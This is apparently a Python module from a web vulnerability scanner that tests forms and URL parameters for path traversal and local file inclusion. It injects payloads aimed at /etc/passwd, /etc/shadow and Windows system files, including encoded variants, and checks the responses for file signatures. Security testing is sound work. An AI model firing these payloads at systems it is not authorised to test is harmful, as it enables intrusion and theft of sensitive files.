"""Path traversal and LFI vulnerability tester"""
import asyncio
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from app.core.logger import logger

class PathTraversalTester:
    """Test for path traversal and LFI vulnerabilities"""
    
    def __init__(self, session):
        self.session = session
        self.vulnerabilities = []
    
    async def test_path_traversal(self, base_url, content):
        """Test for path traversal vulnerabilities"""
        # Parse forms for file parameter testing
        soup = BeautifulSoup(content, 'html.parser')
        
        # Test forms with file-related parameters
        for form in soup.find_all('form'):
            await self._test_form_path_traversal(base_url, form)
        
        # Test URL parameters
        await self._test_url_path_traversal(base_url)
        
        return self.vulnerabilities
    
    async def _test_form_path_traversal(self, base_url, form):
        """Test form fields for path traversal"""
        action = form.get('action', base_url)
        method = form.get('method', 'GET').upper()
        
        # Build form action URL
        if not action.startswith('http'):
            action = urljoin(base_url, action)
        
        # Get form fields, focus on file-related ones
        fields = {}
        file_related_fields = []
        
        for field in form.find_all(['input', 'textarea', 'select']):
            name = field.get('name', '').lower()
            if name and field.get('type') != 'submit':
                fields[name] = 'test'
                # Check if field name suggests file operations
                if any(keyword in name for keyword in ['file', 'path', 'dir', 'page', 'include', 'template', 'doc']):
                    file_related_fields.append(name)
        
        if not fields:
            return
        
        # If no obvious file fields, test all fields
        if not file_related_fields:
            file_related_fields = list(fields.keys())[:3]  # Limit to first 3 fields
        
        # Test path traversal payloads
        await self._test_lfi_payloads(action, method, fields, file_related_fields)
    
    async def _test_lfi_payloads(self, action, method, fields, target_fields):
        """Test LFI/path traversal payloads"""
        lfi_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '../../../etc/shadow',
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini',
            '/etc/passwd',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        
        # Indicators of successful LFI
        lfi_indicators = [
            'root:x:0:0:',
            'daemon:x:1:1:',
            'bin:x:2:2:',
            '[boot loader]',
            '[operating systems]',
            'for 16-bit app support',
            '# This file contains the mappings',
            'localhost',
            '127.0.0.1'
        ]
        
        for payload in lfi_payloads:
            for field_name in target_fields:
                test_fields = fields.copy()
                test_fields[field_name] = payload
                
                try:
                    if method == 'POST':
                        async with self.session.post(action, data=test_fields, timeout=10) as response:
                            content = await response.text()
                            # Check for LFI indicators
                            if any(indicator in content for indicator in lfi_indicators):
                                self.vulnerabilities.append({
                                    'type': 'Local File Inclusion (LFI)',
                                    'severity': 'CRITICAL',
                                    'description': f'LFI vulnerability found in form field "{field_name}" at {action}',
                                    'url': action,
                                    'parameter': field_name,
                                    'payload': payload
                                })
                                break  # Found vulnerability, no need to test more payloads for this field
                    else:
                        # GET request
                        async with self.session.get(action, params=test_fields, timeout=10) as response:
                            content = await response.text()
                            # Check for LFI indicators
                            if any(indicator in content for indicator in lfi_indicators):
                                self.vulnerabilities.append({
                                    'type': 'Local File Inclusion (LFI)',
                                    'severity': 'CRITICAL',
                                    'description': f'LFI vulnerability found in parameter "{field_name}" at {action}',
                                    'url': action,
                                    'parameter': field_name,
                                    'payload': payload
                                })
                                break  # Found vulnerability, no need to test more payloads for this field
                
                except Exception as _exc:
                    pass
                    logger.debug("Suppressed exception", exc_info=True)
    
    async def _test_url_path_traversal(self, base_url):
        """Test URL parameters for path traversal"""
        parsed = urlparse(base_url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        base_url_no_params = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Focus on file-related parameters
        file_params = []
        for param_name in params.keys():
            if any(keyword in param_name.lower() for keyword in ['file', 'path', 'dir', 'page', 'include', 'template', 'doc']):
                file_params.append(param_name)
        
        # If no obvious file params, test all params
        if not file_params:
            file_params = list(params.keys())[:2]  # Limit to first 2 params
        
        lfi_payload = '../../../etc/passwd'
        lfi_indicators = [
            'root:x:0:0:',
            'daemon:x:1:1:',
            'bin:x:2:2:'
        ]
        
        for param_name in file_params:
            test_params = {k: v[0] if v else '' for k, v in params.items()}
            test_params[param_name] = lfi_payload
            
            try:
                async with self.session.get(base_url_no_params, params=test_params, timeout=10) as response:
                    content = await response.text()
                    if any(indicator in content for indicator in lfi_indicators):
                        self.vulnerabilities.append({
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'CRITICAL',
                            'description': f'LFI vulnerability found in URL parameter "{param_name}"',
                            'url': base_url_no_params,
                            'parameter': param_name,
                            'payload': lfi_payload
                        })
            except Exception as _exc:
                pass
                logger.debug("Suppressed exception", exc_info=True)
